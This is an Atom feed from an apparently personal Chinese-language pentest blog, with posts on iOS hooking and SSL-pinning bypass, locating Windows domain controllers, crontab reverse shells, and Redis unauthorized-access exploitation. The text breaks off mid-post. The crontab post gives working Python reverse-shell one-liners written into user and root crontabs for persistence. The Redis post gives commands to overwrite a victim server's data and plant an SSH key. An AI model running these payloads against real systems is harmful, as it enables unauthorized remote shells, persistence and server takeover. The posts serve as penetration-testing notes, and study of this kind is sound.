<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Smilent</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://blog.smilent.me/"/>
  <updated>2016-11-23T06:13:38.000Z</updated>
  <id>http://blog.smilent.me/</id>
  
  <author>
    <name>Smilent</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>iOS Security Tricks</title>
    <link href="http://blog.smilent.me/2016-11-22-iOS-security-tricks.html"/>
    <id>http://blog.smilent.me/2016-11-22-iOS-security-tricks.html</id>
    <published>2016-11-21T16:00:00.000Z</published>
    <updated>2016-11-23T06:13:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="iOS-Security"><a href="#iOS-Security" class="headerlink" title="iOS Security"></a>iOS Security</h1><p>总结iOS App安全评估所用到的一些trick。</p><h1 id="Cycript"><a href="#Cycript" class="headerlink" title="Cycript"></a>Cycript</h1><p>打印指定类的所用的方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">printMethods</span>(<span class="params">className, isa</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> count = <span class="keyword">new</span> <span class="keyword">new</span> Type(<span class="string">"I"</span>);</span><br><span class="line">  <span class="keyword">var</span> classObj = (isa != <span class="literal">undefined</span>) ? objc_getClass(className)-&gt;isa : objc_getClass(className);</span><br><span class="line">  <span class="keyword">var</span> methods = class_copyMethodList(classObj, count);</span><br><span class="line">  <span class="keyword">var</span> methodsArray = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; *count; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> method = methods[i];</span><br><span class="line">    methodsArray.push(&#123;<span class="attr">selector</span>:method_getName(method), <span class="attr">implementation</span>:method_getImplementation(method)&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  free(methods);</span><br><span class="line">  <span class="keyword">return</span> methodsArray;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>寻找Button的事件响应防范：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cy# [button allTargets]</span><br><span class="line">[NSSet setWithArray:@[#&quot;&lt;ViewController: 0x20869990&gt;&quot;]]]</span><br><span class="line">cy# [button allControlEvents]</span><br><span class="line">64</span><br><span class="line">cy# [button actionsForTarget:#0x20869990 forControlEvent:64]</span><br><span class="line">@[&quot;onClick&quot;]</span><br></pre></td></tr></table></figure><a id="more"></a><h1 id="SSL-Pinning"><a href="#SSL-Pinning" class="headerlink" title="SSL Pinning"></a>SSL Pinning</h1><p>自建证书，忽略证书错误，中间人攻击</p><p>试想这样一种场景，如果在最开始，攻击者就拦截掉客户端与服务端的通信。当客户端在请求证书时，攻击者回传一个他自己的假证书，而且攻击者已经通过其他手段欺骗用户在手机上信任了这个假证书，那么当客户端接收到证书并去验证时，是可以通过的。<br>如果安装了可信的证书， 开启强制校验, 公钥绑定</p><h1 id="SSL-Pinning-bypass"><a href="#SSL-Pinning-bypass" class="headerlink" title="SSL Pinning bypass"></a>SSL Pinning bypass</h1><p>iOS-SSL-Kill-Switch</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MSHookFunction((<span class="keyword">void</span> *) SSLHandshake,(<span class="keyword">void</span> *)  replaced_SSLHandshake, (<span class="keyword">void</span> **) &amp;original_SSLHandshake);</span><br><span class="line">MSHookFunction((<span class="keyword">void</span> *) SSLSetSessionOption,(<span class="keyword">void</span> *)  replaced_SSLSetSessionOption, (<span class="keyword">void</span> **) &amp;original_SSLSetSessionOption);</span><br><span class="line">MSHookFunction((<span class="keyword">void</span> *) SSLCreateContext,(<span class="keyword">void</span> *)  replaced_SSLCreateContext, (<span class="keyword">void</span> **) &amp;original_SSLCreateContext);</span><br></pre></td></tr></table></figure><h1 id="MobileHooker"><a href="#MobileHooker" class="headerlink" title="MobileHooker"></a>MobileHooker</h1><p>MoblieHooker的作用是替换系统函数，hook。主要包含两个函数：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MSHookMessageEx</span><span class="params">(Class class, SEL selector, IMP replacement, IMP *result)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MSHookFunction</span><span class="params">(<span class="keyword">void</span>* function, <span class="keyword">void</span>* replacement, <span class="keyword">void</span>** p_original)</span></span>;</span><br></pre></td></tr></table></figure><p>MSHookMessageEx作用于Objective-C，通过调用method_setImplementation函数将[class selector]的实现改为新的实现方法，达到hook的目的。<br>MSHookFunction作用于下面是hook C/C++代码。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="meta-string">&lt;substrate.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> (*old__ZN8CPPClass11CPPFunctionEPKc)(<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">char</span> *);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">new__ZN8CPPClass11CPPFunctionEPKc</span><span class="params">(<span class="keyword">void</span> *hiddenThis, <span class="keyword">const</span> <span class="keyword">char</span> *arg0)</span> </span>&#123;</span><br><span class="line">    NSLog(@<span class="string">"Hijaik C++ function!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">%ctor</span><br><span class="line">&#123;</span><br><span class="line">    @autoreleasepool&#123;</span><br><span class="line">        MSImageRef image = MSGetImageByName(<span class="string">"/Application/iOSRETargetApp.app/iOSRETargetApp"</span>);</span><br><span class="line">        <span class="keyword">void</span> *__ZN8CPPClass11CPPFunctionEPKc = MSFindSymbol(image, <span class="string">"__ZN8CPPClass11CPPFunctionEPKc"</span>);</span><br><span class="line">        <span class="keyword">if</span>(__ZN8CPPClass11CPPFunctionEPKc) NSLog(@<span class="string">"Find CPPClass Function"</span>);</span><br><span class="line">        <span class="comment">//Hook CPPClass::CPPFcuntion</span></span><br><span class="line">        MSHookFunction((<span class="keyword">void</span> *)__ZN8CPPClass11CPPFunctionEPKc, (<span class="keyword">void</span> *)&amp;new__ZN8CPPClass11CPPFunctionEPKc, (<span class="keyword">void</span> **)&amp;old__ZN8CPPClass11CPPFunctionEPKc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Hook Objective-C 方法.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#import <span class="meta-string">&lt;substrate.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">void</span> <span class="params">(*oldViewDidLoad)</span><span class="params">(id self, SEL _cmd)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">newViewDidLoad</span><span class="params">(id self, SEL _cmd)</span> </span>&#123;</span><br><span class="line">    NSLog(@<span class="string">"Hook ViewDidLoad"</span>);</span><br><span class="line">    oldViewDidLoad(self, _cmd);</span><br><span class="line">&#125;</span><br><span class="line">%ctor</span><br><span class="line">&#123;</span><br><span class="line">    @autoreleasepool&#123;</span><br><span class="line">        <span class="comment">//Hook OC method</span></span><br><span class="line">        <span class="comment">//MSHookMessageEx((Class)objc_getClass("XXRootViewController"), @selector(viewDidLoad),(IMP)&amp;newViewDidLoad, (IMP*)&amp;oldViewDidLoad);</span></span><br><span class="line">        MSHookMessageEx(NSClassFromString(@<span class="string">"XXRootViewController"</span>), @selector(viewDidLoad),(IMP)&amp;newViewDidLoad, (IMP*)&amp;oldViewDidLoad);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Logs语法"><a href="#Logs语法" class="headerlink" title="Logs语法"></a>Logs语法</h1><p>hook NSURLConnection</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">%hook NSURLConnection</span><br><span class="line">+ (NSData *)sendSynchronousRequest:(NSURLRequest *)request returningResponse:(NSURLResponse **)response error:(NSError **)error</span><br><span class="line">&#123;</span><br><span class="line">    %<span class="built_in">log</span>;</span><br><span class="line">    NSData * origResult = %orig(request, response, error);</span><br><span class="line">    <span class="keyword">return</span> origResult;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">+ (<span class="keyword">void</span>)sendAsynchronousRequest:(NSURLRequest *)request <span class="built_in">queue</span>:(NSOperationQueue *)<span class="built_in">queue</span> completionHandler:(<span class="keyword">void</span> (^)(NSURLResponse* response, NSData* data, NSError* connectionError)) handler &#123;</span><br><span class="line">    NSLog(@<span class="string">"Handler %@ "</span>, handler);</span><br><span class="line">    <span class="comment">//Hook block function</span></span><br><span class="line">    <span class="keyword">void</span> (^customBlock)(NSURLResponse *resp, NSData *da, NSError *err) = ^(NSURLResponse *resp, NSData *da, NSError *err)&#123;</span><br><span class="line">        NSLog(@<span class="string">"%@"</span>, resp);</span><br><span class="line">    &#125;;</span><br><span class="line">%orig(request, <span class="built_in">queue</span>, customBlock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">%end</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;iOS-Security&quot;&gt;&lt;a href=&quot;#iOS-Security&quot; class=&quot;headerlink&quot; title=&quot;iOS Security&quot;&gt;&lt;/a&gt;iOS Security&lt;/h1&gt;&lt;p&gt;总结iOS App安全评估所用到的一些trick。&lt;/p&gt;
&lt;h1 id=&quot;Cycript&quot;&gt;&lt;a href=&quot;#Cycript&quot; class=&quot;headerlink&quot; title=&quot;Cycript&quot;&gt;&lt;/a&gt;Cycript&lt;/h1&gt;&lt;p&gt;打印指定类的所用的方法：&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;printMethods&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;className, isa&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; count = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Type(&lt;span class=&quot;string&quot;&gt;&quot;I&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; classObj = (isa != &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;) ? objc_getClass(className)-&amp;gt;isa : objc_getClass(className);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; methods = class_copyMethodList(classObj, count);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; methodsArray = [];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; *count; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; method = methods[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    methodsArray.push(&amp;#123;&lt;span class=&quot;attr&quot;&gt;selector&lt;/span&gt;:method_getName(method), &lt;span class=&quot;attr&quot;&gt;implementation&lt;/span&gt;:method_getImplementation(method)&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  free(methods);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; methodsArray;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;寻找Button的事件响应防范：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;cy# [button allTargets]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;[NSSet setWithArray:@[#&amp;quot;&amp;lt;ViewController: 0x20869990&amp;gt;&amp;quot;]]]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cy# [button allControlEvents]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cy# [button actionsForTarget:#0x20869990 forControlEvent:64]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;@[&amp;quot;onClick&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="web" scheme="http://blog.smilent.me/categories/web/"/>
    
    
      <category term="iOS" scheme="http://blog.smilent.me/tags/iOS/"/>
    
      <category term="cycript" scheme="http://blog.smilent.me/tags/cycript/"/>
    
      <category term="theos" scheme="http://blog.smilent.me/tags/theos/"/>
    
      <category term="MSHookMessageEx" scheme="http://blog.smilent.me/tags/MSHookMessageEx/"/>
    
  </entry>
  
  <entry>
    <title>Find Domain Controller</title>
    <link href="http://blog.smilent.me/2016-06-06-find-domain-controller.html"/>
    <id>http://blog.smilent.me/2016-06-06-find-domain-controller.html</id>
    <published>2016-06-05T16:00:00.000Z</published>
    <updated>2016-06-06T15:51:21.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-Find-Domain-Controller-via-DNS"><a href="#0x00-Find-Domain-Controller-via-DNS" class="headerlink" title="0x00 Find Domain Controller via DNS"></a>0x00 Find Domain Controller via DNS</h2><blockquote><p><a href="https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/" target="_blank" rel="noopener">https://blog.netspi.com/5-ways-to-find-systems-running-domain-admin-processes/</a></p></blockquote><p>DC may be  the default DNS server.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\dm1&gt;nslookup -type=SRV _ldap._tcp</span><br><span class="line"></span><br><span class="line">DNS request timed out.</span><br><span class="line"></span><br><span class="line">    timeout was 2 seconds.</span><br><span class="line"></span><br><span class="line">服务器:  UnKnown</span><br><span class="line"></span><br><span class="line">Address:  192.168.72.134</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_ldap._tcp.corp.sm.com  SRV service location:</span><br><span class="line"></span><br><span class="line">          priority       = 0</span><br><span class="line"></span><br><span class="line">          weight         = 100</span><br><span class="line"></span><br><span class="line">          port           = 389</span><br><span class="line"></span><br><span class="line">          svr hostname   = win-dc.corp.sm.com</span><br><span class="line"></span><br><span class="line">win-dc.corp.sm.com      internet address = 192.168.72.134</span><br></pre></td></tr></table></figure><p>or ifconfig.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig /all</span><br></pre></td></tr></table></figure><h2 id="0x01-dsquery-with-Windows-2003"><a href="#0x01-dsquery-with-Windows-2003" class="headerlink" title="0x01 dsquery with Windows 2003"></a>0x01 dsquery with Windows 2003</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dsquery computer</span><br></pre></td></tr></table></figure><h2 id="0x02-net-group"><a href="#0x02-net-group" class="headerlink" title="0x02 net group"></a>0x02 net group</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; /domain</span><br></pre></td></tr></table></figure><h2 id="0x03-net-time"><a href="#0x03-net-time" class="headerlink" title="0x03 net time"></a>0x03 net time</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-Find-Domain-Controller-via-DNS&quot;&gt;&lt;a href=&quot;#0x00-Find-Domain-Controller-via-DNS&quot; class=&quot;headerlink&quot; title=&quot;0x00 Find Domain Contr
      
    
    </summary>
    
      <category term="web" scheme="http://blog.smilent.me/categories/web/"/>
    
    
      <category term="Pentest" scheme="http://blog.smilent.me/tags/Pentest/"/>
    
      <category term="Domain" scheme="http://blog.smilent.me/tags/Domain/"/>
    
      <category term="DC" scheme="http://blog.smilent.me/tags/DC/"/>
    
  </entry>
  
  <entry>
    <title>Linux crontab back Shell</title>
    <link href="http://blog.smilent.me/2016-05-25-linux-crontab-rebound-shell-hole.html"/>
    <id>http://blog.smilent.me/2016-05-25-linux-crontab-rebound-shell-hole.html</id>
    <published>2016-05-24T16:00:00.000Z</published>
    <updated>2016-06-03T10:27:19.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>今天测试docker remote api未授权访问漏洞的时候，在ubuntu上使用<code>bash</code>反弹shell，一直不成功。查看<code>/var/log/syslog</code></p><p> <img src="http://joychou.org/usr/uploads/2016/05/1700093592.png" alt="1"></p><p>图中圈出来的内容，表示执行该定时任务的时候报错，报错信息无法输出</p><p>所以很惊讶为什么不能够成功，不管是<code>/etc/crontab</code>还是<code>/var/spool/cron/crontabs/</code><br><a id="more"></a><br>所以有了下面的内容</p><p>测试环境：</p><ul><li>ubuntu 14.04</li><li>centos 6.5</li></ul><h3 id="0x01-1号坑（ubuntu不能使用bash反弹shell）"><a href="#0x01-1号坑（ubuntu不能使用bash反弹shell）" class="headerlink" title="0x01 1号坑（ubuntu不能使用bash反弹shell）"></a>0x01 1号坑（ubuntu不能使用<code>bash</code>反弹shell）</h3><p>可能大家平时比较少人ubuntu，所以不大知道这个特性</p><p>今天让几个朋友测试了，结果是：<br><code>/etc/crontab</code>和<code>/var/spool/cron/crontabs/</code>，<code>bash -i</code>反弹shell都失败</p><p>但是python可以，而且现在centos和ubuntu基本都自带python</p><p>执行以下命令，以当前bash权限用户，创建一个crontab文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;<span class="built_in">printf</span> <span class="string">"* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"</span>)|crontab -</span><br></pre></td></tr></table></figure></p><p><code>crontab -</code>将管道符前面的内容写入到当前用户的crontab文件里</p><p><code>* * * * *</code>表示每一分钟执行该命令，等同于<code>*/1 * * * *</code></p><p>如果是ubuntu的root权限，写到<code>/var/spool/cron/crontabs/root</code>文件<br>如果是centos的root权限，写到<code>/var/spool/cron/root</code></p><p>执行成功后，相应的文件创建或者追加如下内容<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * *  /usr/bin/python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></span><br></pre></td></tr></table></figure></p><h3 id="0x02-2号坑（ubuntu用户的定时任务在-var-spool-cron-crontabs-目录下）"><a href="#0x02-2号坑（ubuntu用户的定时任务在-var-spool-cron-crontabs-目录下）" class="headerlink" title="0x02 2号坑（ubuntu用户的定时任务在/var/spool/cron/crontabs/目录下）"></a>0x02 2号坑（ubuntu用户的定时任务在<code>/var/spool/cron/crontabs/</code>目录下）</h3><p>之前，一直误认为所有linux系统用户的定时任务都在<code>/var/spool/cron/</code>目录下</p><p>其实是我自以为，人最怕只以为是……</p><p>现在回想起来，终于可以解释之前写的hackredis.py中，为何有时不能创建<code>/root/.ssh/</code>目录</p><p>因为代码中我写的crontab文件固定，是<code>/var/spool/cron/root</code>，导致在ubuntu系统中，定时任务未能成功创建</p><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>如果只能写文件，想反弹shell通用（比如redis未授权访问）</p><ol><li>写<code>/etc/crontab</code>文件</li><li>使用python反弹shell的脚本<br>如果可以执行命令，想反弹shell通用（比如docker remote api未授权访问)</li><li>写当前用户下的crontab 或者写<code>/etc/crontab</code>也可以</li><li>使用python反弹shell的脚本</li></ol><p>写当前用户下的crontab：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(crontab -l;<span class="built_in">printf</span> <span class="string">"* * * * *  /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"</span>)|crontab -</span><br></pre></td></tr></table></figure></p><p>写/etc/crontab：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"* * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"127.0.0.1\",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</span> &gt;&gt; /etc/crontab</span><br></pre></td></tr></table></figure></p><p>原文:<a href="http://joychou.org/index.php/web/linux-crontab-rebound-shell-hole.html" target="_blank" rel="noopener">JoyChou</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h3&gt;&lt;p&gt;今天测试docker remote api未授权访问漏洞的时候，在ubuntu上使用&lt;code&gt;bash&lt;/code&gt;反弹shell，一直不成功。查看&lt;code&gt;/var/log/syslog&lt;/code&gt;&lt;/p&gt;
&lt;p&gt; &lt;img src=&quot;http://joychou.org/usr/uploads/2016/05/1700093592.png&quot; alt=&quot;1&quot;&gt;&lt;/p&gt;
&lt;p&gt;图中圈出来的内容，表示执行该定时任务的时候报错，报错信息无法输出&lt;/p&gt;
&lt;p&gt;所以很惊讶为什么不能够成功，不管是&lt;code&gt;/etc/crontab&lt;/code&gt;还是&lt;code&gt;/var/spool/cron/crontabs/&lt;/code&gt;&lt;br&gt;
    
    </summary>
    
      <category term="web" scheme="http://blog.smilent.me/categories/web/"/>
    
    
      <category term="Linux" scheme="http://blog.smilent.me/tags/Linux/"/>
    
      <category term="Shell" scheme="http://blog.smilent.me/tags/Shell/"/>
    
  </entry>
  
  <entry>
    <title>Redis vulnerability via SSH authorized_keys</title>
    <link href="http://blog.smilent.me/2015-11-10-redis-vulnerability-via-ssh-authorized-keys.html"/>
    <id>http://blog.smilent.me/2015-11-10-redis-vulnerability-via-ssh-authorized-keys.html</id>
    <published>2015-11-09T16:00:00.000Z</published>
    <updated>2016-06-03T09:19:59.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>配置错误的Redis可通过将公钥写入.ssh/authorized_keys，使攻击者拿到服务器权限。</p><h3 id="0x01-测试环境"><a href="#0x01-测试环境" class="headerlink" title="0x01 测试环境"></a>0x01 测试环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">victim server CentOS6.6+redis2.4  192.168.192.133</span><br><span class="line"></span><br><span class="line">attack server CentOS6.6  192.168.192.132</span><br></pre></td></tr></table></figure><p>先在attack server生成一个公钥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;redis&quot;</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat redis.pub; echo -e &quot;\n\n&quot;) &gt; redis.txt</span><br></pre></td></tr></table></figure></p><p>然后执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.192.133 flushall</span><br><span class="line"></span><br><span class="line">cat redis.txt | redis-cli -h 192.168.192.133 -x set pwn</span><br></pre></td></tr></table></figure></p><p>登录redis  redis-cli -h 192.168.192.133<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 